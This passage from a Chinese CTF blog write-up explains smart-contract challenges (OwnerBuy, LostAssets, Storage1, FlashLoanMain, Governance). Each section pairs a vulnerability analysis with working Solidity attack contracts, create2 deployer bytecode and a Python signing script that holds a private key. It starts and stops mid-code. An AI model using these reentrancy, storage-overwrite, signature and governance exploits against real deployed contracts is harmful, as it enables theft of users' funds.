14947c7fb63098acee553a411ffe0aa1d829d1c303b92464736f6c63430007060033&quot;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">deploy</span>(<span class="params">bytes32 salt</span>) public <span class="title function_">returns</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    bytes memory bytecode = contractBytecode;</span><br><span class="line">    address addr;</span><br><span class="line">      </span><br><span class="line">    assembly &#123;</span><br><span class="line">      addr := <span class="title function_">create2</span>(<span class="number">0</span>, <span class="title function_">add</span>(bytecode, <span class="number">0x20</span>), <span class="title function_">mload</span>(bytecode), salt)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getHash</span>(<span class="params"></span>)public view <span class="title function_">returns</span>(<span class="params">bytes32</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">keccak256</span>(contractBytecode);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟我们的思路一样，先根据脚本（同样在代码仓库中）计算出salt，利用creat2部署攻击合约，在攻击合约中先设定包含我们自己地址的root，随后调用withdraw函数即可完成攻击。<br><img src="https://img-blog.csdnimg.cn/e58beff2fc3d43ad98d81ab687f5b089.png" alt="在这里插入图片描述"></p>
+<h1 id="OwnerBuy"><a href="#OwnerBuy" class="headerlink" title="OwnerBuy"></a>OwnerBuy</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>题目需要我们的Times大于100。<br>整个合约中只有buy和sell函数涉及到了Times的增减，buy将我们的Times设定为1，而sell函数将我们的Times–，这里能想到下溢。</p>
+<p>我们分别分析两个函数。<br><img src="https://img-blog.csdnimg.cn/ad22436cdef94c84994e0454fbc78c6a.png" alt="在这里插入图片描述"><br>要调用buy就需要绕过其中的多个限制，需要owner为指定地址，且需要中间合约，并且Times为0，balance为0，msg.value=1，即可给我们100的余额，且Times为1.</p>
+<p>其他的都很好通过，唯独需要指定地址的owner，需要我们先成为owner，再把owner转给指定地址。</p>
+<p><img src="https://img-blog.csdnimg.cn/546eb61b1ffe454fbf79f854bdc455ec.png" alt="在这里插入图片描述"><br>成为owner需要我们地址的后四位为ffff，同样是利用creat2即可。<br>再来看sell<br><img src="https://img-blog.csdnimg.cn/1e63fe450c734da1a111ae67314a1460.png" alt="在这里插入图片描述"><br>输入值大于200，creat2,Times大于0，balance大于输入值，随后会调用我们的fallback，这里很明显可以重入，且在Times为1的情况下重入一次即可发生下溢，唯一需要的就是我们的余额至少要大于四百，因为需要给合约转两次两百以上的转账。</p>
+<p>由于每次buy都只能获得一百的余额，所以一个账户肯定是不行的，我们需要准备四个账户。<br><img src="https://img-blog.csdnimg.cn/f5d682439e3f473281a3bf1cd38a6761.png" alt="在这里插入图片描述"><br>transfer函数也需要注意，如果接受者不是白名单的话，最大的余额不能超过一百，我们成为owner的时候需要把我们自己和合约地址设定为白名单。</p>
+<h2 id="攻击-3"><a href="#攻击-3" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0.5.1-c8a2</span></span><br><span class="line"><span class="comment">// Enable optimization</span></span><br><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./OwnerBuy.sol&quot;</span>;</span><br><span class="line">contract ownerBuyAttack&#123;</span><br><span class="line">    <span class="title class_">OwnerBuy</span> ownerbuy;</span><br><span class="line">    bool public count;</span><br><span class="line">    bool public isowner;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>)public payable&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isOwner</span>(<span class="params">address owner</span>) external returns (bool)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!isowner)&#123;</span><br><span class="line">            isowner=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        isowner=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">init</span> (address _addr)public payable&#123;</span><br><span class="line">        ownerbuy = <span class="title class_">OwnerBuy</span>(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">becomeOwner</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        ownerbuy.<span class="title function_">changestatus</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        ownerbuy.<span class="title function_">changeOwner</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setWhite</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        ownerbuy.<span class="title function_">setWhite</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        ownerbuy.<span class="title function_">setWhite</span>(<span class="title function_">address</span>(ownerbuy));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferOwner</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        ownerbuy.<span class="title function_">transferOwnership</span>(<span class="number">0x220866B1A2219f40e72f5c628B65D54268cA3A9D</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">buy</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        ownerbuy.<span class="property">buy</span>.<span class="title function_">value</span>(<span class="number">1</span>)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sell</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        ownerbuy.<span class="title function_">sell</span>(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">finish</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        ownerbuy.<span class="title function_">finish</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>)external payable&#123;</span><br><span class="line">        <span class="keyword">if</span>(!count)&#123;</span><br><span class="line">            count=<span class="literal">true</span>;</span><br><span class="line">            ownerbuy.<span class="title function_">sell</span>(<span class="number">200</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract helper&#123;</span><br><span class="line">    <span class="title class_">OwnerBuy</span> ownerbuy;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _addr</span>)public&#123;</span><br><span class="line">        ownerbuy = <span class="title class_">OwnerBuy</span>(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">buy</span>(<span class="params"></span>)public payable&#123;</span><br><span class="line">        ownerbuy.<span class="property">buy</span>.<span class="title function_">value</span>(<span class="number">1</span>)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address attacker</span>)public&#123;</span><br><span class="line">        ownerbuy.<span class="title function_">transfer</span>(attacker,<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>部署合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract deployed&#123;</span><br><span class="line">   </span><br><span class="line">    bytes contractBytecode = hex<span class="string">&quot;60806040526109eb806100136000396000f3fe6080604052600436106100915760003560e01c8063a6f2ae3a11610059578063a6f2ae3a1461027e578063d56b288914610295578063df05f42e146102ac578063ead4d3db146102c3578063f9dca989146102f257610091565b806306661abd1461017457806319ab453c146101a35780632f54bf6e146101e757806345710074146102505780637e10e9d114610267575b600060149054906101000a900460ff16610172576001600060146101000a81548160ff0219169083151502179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561013557600080fd5b505af1158015610149573d6000803e3d6000fd5b505050506040513d602081101561015f57600080fd5b8101908080519060200190929190505050505b005b34801561018057600080fd5b50610189610309565b604051808215151515815260200191505060405180910390f35b6101e5600480360360208110156101b957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061031c565b005b3480156101f357600080fd5b506102366004803603602081101561020a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061035f565b604051808215151515815260200191505060405180910390f35b34801561025c57600080fd5b506102656103bc565b005b34801561027357600080fd5b5061027c61046f565b005b34801561028a57600080fd5b5061029361064a565b005b3480156102a157600080fd5b506102aa6106f3565b005b3480156102b857600080fd5b506102c161079a565b005b3480156102cf57600080fd5b506102d8610868565b604051808215151515815260200191505060405180910390f35b3480156102fe57600080fd5b5061030761087b565b005b600060149054906101000a900460ff1681565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008060159054906101000a900460ff16610398576001600060156101000a81548160ff021916908315150217905550600090506103b7565b60008060156101000a81548160ff021916908315150217905550600190505b919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561043157600080fd5b505af1158015610445573d6000803e3d6000fd5b505050506040513d602081101561045b57600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561050f57600080fd5b505af1158015610523573d6000803e3d6000fd5b505050506040513d602081101561053957600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561060c57600080fd5b505af1158015610620573d6000803e3d6000fd5b505050506040513d602081101561063657600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a60016040518263ffffffff1660e01b81526004016020604051808303818588803b1580156106b457600080fd5b505af11580156106c8573d6000803e3d6000fd5b50505050506040513d60208110156106df57600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d56b28896040518163ffffffff1660e01b8152600401602060405180830381600087803b15801561075c57600080fd5b505af1158015610770573d6000803e3d6000fd5b505050506040513d602081101561078657600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f2fde38b73220866b1a2219f40e72f5c628b65d54268ca3a9d6040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561084e57600080fd5b505af1158015610862573d6000803e3d6000fd5b50505050565b600060159054906101000a900460ff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166351ec819f306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561091b57600080fd5b505af115801561092f573d6000803e3d6000fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166362a094776040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561099c57600080fd5b505af11580156109b0573d6000803e3d6000fd5b5050505056fea265627a7a72315820490de0313b1ad79570c77ae043ce5fe65f40e32cd15657be89fd034ab9e52c2464736f6c63430005110032&quot;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">deploy</span>(<span class="params">bytes32 salt</span>) public <span class="title function_">returns</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    bytes memory bytecode = contractBytecode;</span><br><span class="line">    address addr;</span><br><span class="line">      </span><br><span class="line">    assembly &#123;</span><br><span class="line">      addr := <span class="title function_">create2</span>(<span class="number">0</span>, <span class="title function_">add</span>(bytecode, <span class="number">0x20</span>), <span class="title function_">mload</span>(bytecode), salt)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getHash</span>(<span class="params"></span>)public view <span class="title function_">returns</span>(<span class="params">bytes32</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">keccak256</span>(contractBytecode);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先调用init函数初始化并传入eth供后面使用，然后调用becomeOwner成为owner，然后将我们和合约地址设为白名单，随后转走owner，调用buy。<br>然后部署三个用来helper合约，用来拿到更多的balance，转给攻击合约辅助后面的攻击。<br><img src="https://img-blog.csdnimg.cn/a5267847fdb74b6e80bec8daa52194fb.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/60475fada6be4eefaa793651184ed4c8.png" alt="在这里插入图片描述"><br>到这一步我们的balance应该为400，Times为1<br>随后再成为owner，调用sell函数即可，然后调用finish函数，合约中的钱已经被我们全部转走，完成攻击。<br><img src="https://img-blog.csdnimg.cn/5f61abc329bc4d02bb63aab4a0d0502f.png"><br><img src="https://img-blog.csdnimg.cn/30b50f8c5df74a7ba7b7c4c9e20b81bb.png" alt="在这里插入图片描述"></p>
+<h1 id="LostAssets"><a href="#LostAssets" class="headerlink" title="LostAssets"></a>LostAssets</h1><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p><img src="https://img-blog.csdnimg.cn/3b7595d98c364fbba940c14bc4397a7d.png" alt="在这里插入图片描述"><br>题目要求我们拿走合约所有的weth。<br>合约提供了两种token，一种erc20也就是weth，另一种为erc20permit，也就是sweth，对weth进行了权限的封装。<br><img src="https://img-blog.csdnimg.cn/12ce5c19743b4f1cbb938f168174d4d2.png" alt="在这里插入图片描述"><br>此题重点在这个函数，他需要我们拿到对应的授权，才允许我们转走weth，乍一看好像并没有问题，但是weth本身并没有继承erc20permit<br><img src="https://img-blog.csdnimg.cn/9037ef79812442dca71bba02c01df2a6.png" alt="在这里插入图片描述"><br>也就是说，验证权限的这一部分代码没有任何意义，直接跳到了下面的转账。<br><img src="https://img-blog.csdnimg.cn/e9ff3f53be3548b7b4d3e91cd0f0cc4c.png" alt="在这里插入图片描述"><br>所以我们直接转账即可完成攻击。</p>
+<h2 id="攻击-4"><a href="#攻击-4" class="headerlink" title="攻击"></a>攻击</h2><p>输入对应的参数即可，hash,r,s,v等都可以随便输，完成攻击。<br><img src="https://img-blog.csdnimg.cn/b3c2e7738f4f4ccf8e13cf8a439577e8.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5b5eb3a9373e4413912d912170b7ba2d.png" alt="在这里插入图片描述"></p>
+<h1 id="Storage1"><a href="#Storage1" class="headerlink" title="Storage1"></a>Storage1</h1><h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><p><img src="https://img-blog.csdnimg.cn/29d77bbcdc914801942e9e2166e40d9d.png" alt="在这里插入图片描述"><br>题目要求我们成为admin，并且我们的gasDeposits要很大。</p>
+<p>合约里面好像并没有改变admin的方法，并且gasDeposits也是根据我们传入的value值进行改变的，所以我们需要另寻他路。<br><img src="https://img-blog.csdnimg.cn/81adfd141d0b48429c24272bb3005857.png" alt="在这里插入图片描述"><br>这个函数很有意思，他让我们可以随意更改storage中的值，那么很明显，我们直接通过这个函数修改admin和我们对应的gasDeposits即可。</p>
+<h2 id="攻击-5"><a href="#攻击-5" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">figure</span>(<span class="params">address _addr</span>)public view <span class="title function_">returns</span>(<span class="params">bytes32</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">keccak256</span>(abi.<span class="title function_">encode</span>(_addr,<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>只是为了计算出我们的depositGas在存储中的位置。<br><img src="https://img-blog.csdnimg.cn/7344f7e30d454059bc729e9fcd527eff.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/877e4a9c932448a79cb2702b44012a03.png" alt="在这里插入图片描述"><br>第一次放入1，放入我们的地址，修改我们为admin。<br>第二次放入计算出的值，放入比9999999999999999999999999999999999大的数，修改我们的gas。<br>攻击成功。<br><img src="https://img-blog.csdnimg.cn/97124ade47f946bb9a1cc199d2d919d6.png" alt="在这里插入图片描述"></p>
+<h1 id="FlashLoanMain"><a href="#FlashLoanMain" class="headerlink" title="FlashLoanMain"></a>FlashLoanMain</h1><h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><p><img src="https://img-blog.csdnimg.cn/e2a1f947dbcf4893b7fc95d938cdf9de.png" alt="在这里插入图片描述"><br>这关要求我们的cert balance大于100个，而airdrop函数一开始就能给我们一百个，所以只要我们的余额多一点就可以了。</p>
+<p>看完合约之后很明显能够知道，我们的目的是利用flashloan函数借钱出来，然后调用isCompleted就行了。<br><img src="https://img-blog.csdnimg.cn/5f3907dc836d4aa0ab5513d6d7fed81e.png" alt="在这里插入图片描述"><br>所以我们的目的就是依次通过这些require，首先第一个require需要我们获得签名，第二个require则限制了转账金额，第三个是向我们转账，第四个执行我们的回退函数，第五个需要把钱从我们手里转回去。</p>
+<p>那么很明显，我们需要绕开的只有第一个require.<br><img src="https://img-blog.csdnimg.cn/51add765ff1d468783cae3040a87eb30.png" alt="在这里插入图片描述"><br>这里就涉及到了以太坊的签名机制，ECDSA会根据我们输入的消息哈希，以及签名来还原出地址，而签名需要用该地址的私钥对消息哈希签名得到，也就是说我们的目标就是拿到对应地址的私钥。<br><img src="https://img-blog.csdnimg.cn/69a2e6cc42454be2ac03614d796329d1.png" alt="在这里插入图片描述"><br>通过还原，给出的几个值，能够得到对应地址为<br>0x001d3F1ef827552Ae1114027BD3ECF1f086bA0F9<br>而这个地址经常用于web3中，所以google一下很轻松就能够获取到他的私钥，可以进行攻击了。</p>
+<h2 id="攻击-6"><a href="#攻击-6" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">contract attck&#123;</span><br><span class="line">    bytes32 public msgHash = <span class="number">0x1a6092262d7dc33c2f4b9913ad9318a8c41a138bb42dfacd4c7b6b46b8656522</span>;</span><br><span class="line">    bytes32 public r = <span class="number">0xb158f1759111cd99128505f450f608c97178e2b6b9b6f7c3b0d2949e3a21cd02</span>;</span><br><span class="line">    bytes32 public s = <span class="number">0x3ade8887fce9b513d41eb36180d6f7d9e072c756991034de2c9a5da541fb8184</span>;</span><br><span class="line">    uint8 public v = <span class="number">0x1b</span>;</span><br><span class="line">    <span class="title class_">FlashLoanMain</span> public flashloanAddr;</span><br><span class="line">    address public flashLoanPriveder;</span><br><span class="line">    <span class="title class_">Cert</span> cert;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">init</span>(<span class="params">address _addr,address _privedor,address _cert</span>)public &#123;</span><br><span class="line">        flashloanAddr = <span class="title class_">FlashLoanMain</span>( _addr);</span><br><span class="line">        flashLoanPriveder = _privedor;</span><br><span class="line">        cert = <span class="title class_">Cert</span>(_cert);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">figure</span>(<span class="params"></span>)public view <span class="title function_">returns</span>(<span class="params">address</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">ECDSAUpgradeable</span>.<span class="title function_">recover</span>(msgHash,v,r,s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">att</span>(<span class="params"></span></span><br><span class="line"><span class="params">        IFlashBorrower borrower,</span></span><br><span class="line"><span class="params">        address token,</span></span><br><span class="line"><span class="params">        uint256 amount,</span></span><br><span class="line"><span class="params">        bytes memory signature</span></span><br><span class="line"><span class="params">        </span>)public&#123;</span><br><span class="line">        <span class="title class_">IFlashLoanPriveder</span>(flashLoanPriveder).<span class="title function_">flashLoan</span>(borrower,token,amount,signature,<span class="title function_">bytes</span>(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">air</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        flashloanAddr.<span class="title function_">airdrop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">onFlashLoan</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address initiator,</span></span><br><span class="line"><span class="params">        address token,</span></span><br><span class="line"><span class="params">        uint256 amount,</span></span><br><span class="line"><span class="params">        bytes calldata data</span></span><br><span class="line"><span class="params">    </span>) external returns (bool)&#123;</span><br><span class="line">        flashloanAddr.<span class="title class_">Complete</span>();</span><br><span class="line">        cert.<span class="title function_">approve</span>(flashLoanPriveder,amount);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>google获取私钥后，接下来的操作就是签名，签名脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line"></span><br><span class="line">messagehash = <span class="string">&quot;0xb4474375ee0d4abdd0612fd733942feeb646d5f85bddaff21aff4acd36c41e8d&quot;</span></span><br><span class="line">privatekey =<span class="string">&quot;0xf8f8a2f43c8376ccb0871305060d7b27b0554d2cc72bccf41b2705608452f315&quot;</span></span><br><span class="line">signMessage = Account.signHash(message_hash=messagehash,</span><br><span class="line">private_key=privatekey)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;signature =&quot;</span>,signMessage)</span><br></pre></td></tr></table></figure>
+<p>由于web3.js和小狐狸的签名都会在签名先加上通用前缀，而这个题并没有加上前缀而是直接进行了ecrecover，所以我选择了使用web3.py来进行签名操作。拿到签名后，把签名以及对应的参数一起放入攻击合约的att函数，即可完成攻击。<br><img src="https://img-blog.csdnimg.cn/39280514825d4d3db4f06d773160ddd1.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7ed5cffd83f14ef3a0a2cb3dbe0ff32a.png" alt="在这里插入图片描述"></p>
+<h1 id="Governance"><a href="#Governance" class="headerlink" title="Governance"></a>Governance</h1><h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h2><p><img src="https://img-blog.csdnimg.cn/d3c0b6e9260a48e18e3d4db9bd331e91.png" alt="在这里插入图片描述"><br>题目要求我们成为validator后才能拿到旗。<br>而成为validator又需要我们的vote也就是投票数大于mster的总数的三分之二。<br><img src="https://img-blog.csdnimg.cn/747201b55692446c90436b4ad211ccce.png" alt="在这里插入图片描述"><br>只有master的owner能进行投票，并且只能投一次，根据对应master的余额获得投票数。<br>masterChef简要来说就是一个拥有利率系统的代币，让人感到出人意料的是下面这个函数。<br><img src="https://img-blog.csdnimg.cn/ade904bfaabe4c3e932020ce432887d5.png" alt="在这里插入图片描述"><br>他的作用是用来取走所有的master，但是却使用了memory类型的变量，也就是说我取出我的钱之后，在代币池中的余额并不会减少，也就是说我们可以凭此拿走池子所有的余额。<br><img src="https://img-blog.csdnimg.cn/66ed0469976a42d2998f94dc38c33853.png" alt="在这里插入图片描述"><br>而只要我们拿到一百万以上的余额，我们就可以成为owner,也就可以投票了<br><img src="https://img-blog.csdnimg.cn/1cc2885f9ae84ef58ebf67a4a0e78e0e.png" alt="在这里插入图片描述"><br>但池子的余额也只有一千万，离总余额的三分之二，也就是七千三百万还差得很远。</p>
+<p>但master同时也是一个erc20代币，我们可以利用多个地址，在我们自己vote之后，把代币发给其他的地址，依次进行vote,很轻松能够拿到多余七千三百万的vote。</p>
+<h2 id="攻击-7"><a href="#攻击-7" class="headerlink" title="攻击"></a>攻击</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    <span class="title class_">MasterChef</span> master;</span><br><span class="line">    <span class="title class_">Governance</span> gover;</span><br><span class="line">    address[<span class="number">7</span>]  helpers;</span><br><span class="line">    address public owner;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _master,address _gover</span>)public&#123;</span><br><span class="line">        master = <span class="title class_">MasterChef</span>(_master);</span><br><span class="line">        gover = <span class="title 